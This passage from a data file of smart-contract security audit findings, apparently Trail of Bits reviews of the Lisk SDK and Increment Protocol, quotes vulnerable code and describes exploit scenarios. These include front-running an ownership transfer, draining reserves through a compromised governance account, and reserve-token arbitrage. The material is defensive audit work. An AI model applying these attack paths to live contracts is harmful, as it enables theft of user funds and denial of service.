attributes. The NFTStore store saves data that is inconsistent with the schema. 43 Lisk SDK v6.1 Sapphire, NFT and PoA Assessment Recommendations Short term, have the code call the validator.validate function on the decoded NFTStoreData data. Long term, review every other modules recover methods for the same issue. 44 Lisk SDK v6.1 Sapphire, NFT and PoA Assessment", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Medium"]}, {"title": "17. The codec.encode function encodes larger than expected integers ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-lisksdk-securityreview.pdf", "body": "The encode function of the Codec class successfully encodes integers larger than expected. This issue can be replicated with the test shown in gure 17.1, in which a value of 2100 is successfully encoded as a uint64 (while the maximum value should be 264-1). describe('uint_validation', () => { const schema_uint64 = { $id: 'test/uint_validation', type: 'object', required: ['amount'], properties: { amount: { dataType: 'uint64', fieldNumber: 1, }, }, }; it('uint64 encoding with larger than expected values', () => { expect(codec.encode(schema_uint64, {amount: BigInt(2)**BigInt(100)})).toThrow(); // This does not throw }); }); Figure 17.1: Test that shows the encode function of the Codec class successfully encoding integers larger than expected Calling the decode method of the Codec class on this encoded data fails, breaking the round-trip property of the encode and decode functions. Exploit Scenario A user successfully stores a value in a modules store that is larger than the maximum integer. The user attempts to use the module again but is unable to because the call to decode fails. 45 Lisk SDK v6.1 Sapphire, NFT and PoA Assessment Recommendations Short term, add checks in the code to prevent integers larger than the maximum value or smaller than the minimum value cannot be encoded or decoded. Long term, extend the test suite for integer encoding and decoding to detect these and similar issues. Always tests the corner cases, such as the maximum and minimum integer boundaries. 46 Lisk SDK v6.1 Sapphire, NFT and PoA Assessment A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "1. Governance role is a single point of failure ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-incrementprotocol-securityreview.pdf", "body": "Because the governance role is centralized and responsible for critical functionalities, it constitutes a single point of failure within the Increment Protocol. The role can perform the following privileged operations:        Whitelisting a perpetual market Setting economic parameters Updating price oracle addresses and setting xed prices for assets Managing protocol insurance funds Updating the addresses of core contracts Adding support for new reserve tokens to the UA contract Pausing and unpausing protocol operations These privileges give governance complete control over the protocol and therefore access to user and protocol funds. This increases the likelihood that the governance account will be targeted by an attacker and incentivizes governance to act maliciously. Note, though, that the governance role is currently controlled by a multisignature wallet (a multisig) and that control may be transferred to a decentralized autonomous organization (DAO) in the future. Exploit Scenario Eve, an attacker, creates a fake token, compromises the governance account, and adds the fake token as a reserve token for UA. She mints UA by making a deposit of the fake token and then burns the newly acquired UA tokens, which enables her to withdraw all USDC from the reserves. Recommendations Short term, minimize the privileges of the governance role and update the documentation to include the implications of those privileges . Additionally, implement reasonable time delays for privileged operations. Long term, document an incident response plan and ensure that the private keys for the multisig are managed safely. Additionally, carefully evaluate the risks of moving from a multisig to a DAO and consider whether the move is necessary.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "2. Inconsistent lower bounds on collateral weights ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-incrementprotocol-securityreview.pdf", "body": "The lower bound on a collateral assets initial weight (when the collateral is rst whitelisted) is dierent from that enforced if the weight is updated; this discrepancy increases the likelihood of collateral seizures by liquidators. A collateral assets weight represents the level of risk associated with accepting that asset as collateral. This risk calculation comes into play when the protocol is assessing whether a liquidator can seize a users non-UA collateral. To determine the value of each collateral asset, the protocol multiplies the users balance of that asset by the collateral weight (a percentage). A riskier asset will have a lower weight and thus a lower value. If the total value of a users non-UA collateral is less than the users UA debt, a liquidator can seize the collateral. When whitelisting a collateral asset, the Perpetual.addWhiteListedCollateral function requires the collateral weight to be between 10% and 100% (gure 2.1). According to the documentation, these are the correct bounds for a collateral assets weight. function addWhiteListedCollateral ( IERC20Metadata asset, uint256 weight , uint256 maxAmount ) public override onlyRole(GOVERNANCE) { if (weight < 1e17) revert Vault_InsufficientCollateralWeight(); if (weight > 1e18) revert Vault_ExcessiveCollateralWeight(); [...] } Figure 2.1: A snippet of the addWhiteListedCollateral function in Vault.sol#L224-230 However, governance can choose to update that weight via a call to Perpetual.changeCollateralWeight , which allows the weight to be between 1% and 100% (gure 2.2). function changeCollateralWeight (IERC20Metadata asset, uint256 newWeight ) external override onlyRole(GOVERNANCE) { uint256 tokenIdx = tokenToCollateralIdx[asset]; if (!((tokenIdx != 0 ) || ( address (asset) == address (UA)))) revert Vault_UnsupportedCollateral(); if (newWeight < 1e16) revert Vault_InsufficientCollateralWeight(); if (newWeight > 1e18) revert Vault_ExcessiveCollateralWeight(); [...] } Figure 2.2: A snippet of the changeCollateralWeight function in Vault.sol#L254-259 If the weight of a collateral asset were mistakenly set to less than 10%, the value of that collateral would decrease, thereby increasing the likelihood of seizures of non-UA collateral. Exploit Scenario Alice, who holds the governance role, decides to update the weight of a collateral asset in response to volatile market conditions. By mistake, Alice sets the weight of the collateral to 1% instead of 10%. As a result of this change, Bobs non-UA collateral assets decrease in value and are seized. Recommendations Short term, change the lower bound on newWeight in the changeCollateralWeight function from 1e16 to 1e17 . Long term, expand the unit test suite to cover additional edge cases and to ensure that the system behaves as expected.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "3. Solidity compiler optimizations can be problematic ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-incrementprotocol-securityreview.pdf", "body": "The Increment Protocol contracts have enabled optional compiler optimizations in Solidity. There have been several optimization bugs with security implications. Moreover, optimizations are actively being developed . Solidity compiler optimizations are disabled by default, and it is unclear how many contracts in the wild actually use them. Therefore, it is unclear how well they are being tested and exercised. Security issues due to optimization bugs have occurred in the past . A medium- to high-severity bug in the Yul optimizer was introduced in Solidity version 0.8.13 and was xed only recently, in Solidity version 0.8.17 . Another medium-severity optimization bugone that caused memory writes in inline assembly blocks to be removed under certain conditions was patched in Solidity 0.8.15. A compiler audit of Solidity from November 2018 concluded that the optional optimizations may not be safe . It is likely that there are latent bugs related to optimization and that new bugs will be introduced due to future optimizations. Exploit Scenario A latent or future bug in Solidity compiler optimizations causes a security vulnerability in the Increment Protocol contracts. Recommendations Short term, measure the gas savings from optimizations and carefully weigh them against the possibility of an optimization-related bug. Long term, monitor the development and adoption of Solidity compiler optimizations to assess their maturity.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "4. Support for multiple reserve tokens allows for arbitrage ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-incrementprotocol-securityreview.pdf", "body": "Because the UA token contract supports multiple reserve tokens, it can be used to swap one reserve token for another at a ratio of 1:1. This creates an arbitrage opportunity, as it enables users to swap reserve tokens with dierent prices. Users can deposit supported reserve tokens in the UA contract in exchange for UA tokens at a 1:1 ratio (gure 4.1). function mintWithReserve ( uint256 tokenIdx , uint256 amount ) external override { // Check that the reserve token is supported if (tokenIdx > reserveTokens.length - 1 ) revert UA_InvalidReserveTokenIndex(); ReserveToken memory reserveToken = reserveTokens[tokenIdx]; // Check that the cap of the reserve token isn't reached uint256 wadAmount = LibReserve.tokenToWad(reserveToken.asset.decimals(), amount); if (reserveToken.currentReserves + wadAmount > reserveToken.mintCap) revert UA_ExcessiveTokenMintCapReached(); _mint( msg.sender , wadAmount); reserveTokens[tokenIdx].currentReserves += wadAmount; reserveToken.asset.safeTransferFrom( msg.sender , address ( this ), amount); } Figure 4.1: The mintWithReserve function in UA.sol#L38-51 Similarly, users can withdraw the amount of a deposit by returning their UA in exchange for any supported reserve token, also at a 1:1 ratio (gure 4.2). function withdraw ( uint256 tokenIdx , uint256 amount ) external override { // Check that the reserve token is supported if (tokenIdx > reserveTokens.length - 1 ) revert UA_InvalidReserveTokenIndex(); IERC20Metadata reserveTokenAsset = reserveTokens[tokenIdx].asset; _burn( msg.sender , amount); reserveTokens[tokenIdx].currentReserves -= amount; uint256 tokenAmount = LibReserve.wadToToken(reserveTokenAsset.decimals(), amount); reserveTokenAsset.safeTransfer( msg.sender , tokenAmount); } Figure 4.2: The withdraw function in UA.sol#L56-66 Thus, a user could mint UA by depositing a less valuable reserve token and then withdraw the same amount of a more valuable token in one transaction, engaging in arbitrage. Exploit Scenario Alice, who holds the governance role, adds USDC and DAI as reserve tokens. Eve notices that DAI is trading at USD 0.99, while USDC is trading at USD 1.00. Thus, she decides to mint a large amount of UA by depositing DAI and to subsequently return the DAI and withdraw USDC, allowing her to make a risk-free prot. Recommendations Short term, document all front-running and arbitrage opportunities in the protocol to ensure that users are aware of them. As development continues, reassess the risks associated with those opportunities and evaluate whether they could adversely aect the protocol . Long term, implement an o-chain monitoring solution (like that detailed in TOB-INC-13 ) to detect any anomalous uctuations in the prices of supported reserve tokens. Additionally, develop an incident response plan to ensure that any issues that arise can be addressed promptly and without confusion. (See appendix D for additional details on creating an incident response plan.)", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "5. Ownership transfers can be front-run ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-incrementprotocol-securityreview.pdf", "body": "The PerpOwnable contract provides an access control mechanism for the minting and burning of a Perpetual contracts vBase or vQuote tokens. The owner of these token contracts is set via the transferPerpOwner function, which assigns the owners address to the perp state variable. This function is designed to be called only once, during deployment, to set the Perpetual contract as the owner of the tokens. Then, as the tokens owner, the Perpetual contract can mint / burn tokens during liquidity provisions, trades, and liquidations. However, because the function is external, anyone can call it to set his or her own malicious address as perp , taking ownership of a contracts vBase or vQuote tokens. function transferPerpOwner ( address recipient ) external { if (recipient == address ( 0 )) revert PerpOwnable_TransferZeroAddress(); if (perp != address ( 0 )) revert PerpOwnable_OwnershipAlreadyClaimed(); perp = recipient; emit PerpOwnerTransferred( msg.sender , recipient); } Figure 5.1: The transferPerpOwner function in PerpOwnable.sol#L29-L35 If the call were front-run, the Perpetual contract would not own the vBase or vQuote tokens, and any attempts to mint / burn tokens would revert. Since all user interactions require the minting or burning of tokens, no liquidity provisions, trades, or liquidations would be possible; the market would be eectively unusable. An attacker could launch such an attack upon every perpetual market deployment to cause a denial of service (DoS). Exploit Scenario Alice, an admin of the Increment Protocol, deploys a new Perpetual contract. Alice then attempts to call transferPerpOwner to set perp to the address of the deployed contract. However, Eve, an attacker monitoring the mempool, sees Alices call to transferPerpOwner and calls the function with a higher gas price. As a result, Eve gains ownership of the virtual tokens and renders the perpetual market useless. Eve then repeats the process with each subsequent deployment of a perpetual market, executing a DoS attack. Recommendations Short term, move all functionality from the PerpOwnable contract to the Perpetual contract. Then add the hasRole modier to the transferPerpOwner function so that the function can be called only by the manager or governance role. Long term, document all cases in which front-running may be possible, along with the implications of front-running for the codebase.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "6. Funding payments are made in the wrong token ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-incrementprotocol-securityreview.pdf", "body": "The funding payments owed to users are made in vBase instead of UA tokens; this results in incorrect calculations of users prot-and-loss (PnL) values, an increased risk of liquidations, and a delay in the convergence of a Perpetual contracts value with that of the underlying base asset. When the protocol executes a trade or liquidity provision, one of its rst steps is settling the funding payments that are due to the calling user. To do that, it calls the _settleUserFundingPayments function in the ClearingHouse contract (gure 6.1). The function sums the funding payments due to the user (as a trader and / or a liquidity provider) across all perpetual markets. Once the function has determined the nal funding payment due to the user ( fundingPayments ), the Vault contracts settlePnL function changes the UA balance of the user. function _settleUserFundingPayments( address account) internal { int256 fundingPayments; uint256 numMarkets = getNumMarkets(); for ( uint256 i = 0 ; i < numMarkets; ) { fundingPayments += perpetuals[i].settleTrader(account) + perpetuals[i].settleLp(account); unchecked { ++i; } } if (fundingPayments != 0 ) { vault.settlePnL(account, fundingPayments); } } Figure 6.1: The _settleUserFundingPayments function in ClearingHouse.sol#L637- Both the Perpetual.settleTrader and Perpetual.settleLp functions internally call _getFundingPayments to calculate the funding payment due to the user for a given market (gure 6.2). function _getFundingPayments( bool isLong, int256 userCumFundingRate, int256 globalCumFundingRate, int256 vBaseAmountToSettle ) internal pure returns ( int256 upcomingFundingPayment) { [...] if (userCumFundingRate != globalCumFundingRate) { int256 upcomingFundingRate = isLong ? userCumFundingRate - globalCumFundingRate : globalCumFundingRate - userCumFundingRate; // fundingPayments = fundingRate * vBaseAmountToSettle upcomingFundingPayment = upcomingFundingRate.wadMul(vBaseAmountToSettle); } } Figure 6.2: The _getFundingPayments function in Perpetual.sol#L1152-1173 However, the upcomingFundingPayment value is expressed in vBase, since it is the product of a percentage, which is unitless, and a vBase token amount, vBaseAmountToSettle . Thus, the fundingPayments value that is calculated in _settleUserFundingPayments is also expressed in vBase. However, the settlePnL function internally updates the users balance of UA, not vBase. As a result, the users UA balance will be incorrect, since the users prot or loss may be signicantly higher or lower than it should be. This discrepancy is a function of the price dierence between the vBase and UA tokens. The use of vBase tokens for funding payments causes three issues. First, when withdrawing UA tokens, the user may lose or gain much more than expected. Second, since the UA balance aects the users collateral reserve total, the balance update may increase or decrease the users risk of liquidation. Finally, since funding payments are not made in the notional asset, the convergence between the mark and index prices may be delayed. Exploit Scenario The BTC / USD perpetual markets mark price is signicantly higher than the index price. Alice, who holds a short position, decides to exit the market. However, the protocol calculates her funding payments in BTC and does not convert them to their UA equivalents before updating her balance. Thus, Alice makes much less than expected. Recommendations Short term, use the vBase.indexPrice() function to convert vBase token amounts to UA before the call to vault.settlePnL . Long term, expand the unit test suite to cover additional edge cases and to ensure that the system behaves as expected.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Low"]}, {"title": "7. Excessive dust collection may lead to premature closures of long positions ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-incrementprotocol-securityreview.pdf", "body": "The upper bound on the amount of funds considered dust by the protocol may lead to the premature closure of long positions. The protocol collects dust to encourage complete closures instead of closures that leave a position with a small balance of vBase. One place that dust collection occurs is the Perpetual contracts _reducePositionOnMarket function (gure 7.1). function _reducePositionOnMarket ( LibPerpetual.TraderPosition memory user, bool isLong , uint256 proposedAmount , uint256 minAmount ) internal returns ( int256 baseProceeds , int256 quoteProceeds , int256 addedOpenNotional , int256 pnl ) { int256 positionSize = int256 (user.positionSize); uint256 bought ; uint256 feePer ; if (isLong) { quoteProceeds = -(proposedAmount.toInt256()); (bought, feePer) = _quoteForBase(proposedAmount, minAmount); baseProceeds = bought.toInt256(); } else { (bought, feePer) = _baseForQuote(proposedAmount, minAmount); quoteProceeds = bought.toInt256(); baseProceeds = -(proposedAmount.toInt256()); } int256 netPositionSize = baseProceeds + positionSize; if (netPositionSize > 0 && netPositionSize <= 1e17) { _donate(netPositionSize.toUint256()); baseProceeds -= netPositionSize; } [...] } Figure 7.1: The _reducePositionOnMarket function in Perpetual.sol#L876-921 If netPositionSize , which represents a users position after its reduction, is between 0 and 1e17 (1/10 of an 18-decimal token), the system will treat the position as closed and donate the dust to the insurance protocol. This will occur regardless of whether the user intended to reduce, rather than fully close, the position. (Note that netPositionSize is positive if the overall position is long. The dust collection mechanism used for short positions is discussed in TOB-INC-11 .) However, if netPositionSize is tracking a high-value token, the donation to Insurance will no longer be insignicant; 1/10 of 1 vBTC, for instance, would be worth ~USD 2,000 (at the time of writing). Thus, the donation of a users vBTC dust (and the resultant closure of the vBTC position) could prevent the user from proting o of a ~USD 2,000 position. Exploit Scenario Alice, who holds a long position in the vBTC / vUSD market, decides to close most of her position. After the swap, netPositionSize is slightly less than 1e17. Since a leftover balance of that amount is considered dust (unbeknownst to Alice), her ~1e17 vBTC tokens are sent to the Insurance contract, and her position is fully closed. Recommendations Short term, have the protocol calculate the notional value of netPositionSize by multiplying it by the return value of the indexPrice function. Then have it compare that notional value to the dust thresholds. Note that the dust thresholds must also be expressed in the notional token and that the comparison should not lead to a signicant decrease in a users position. Long term, document this system edge case to inform users that a fraction of their long positions may be donated to the Insurance contract after being reduced.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Medium"]}]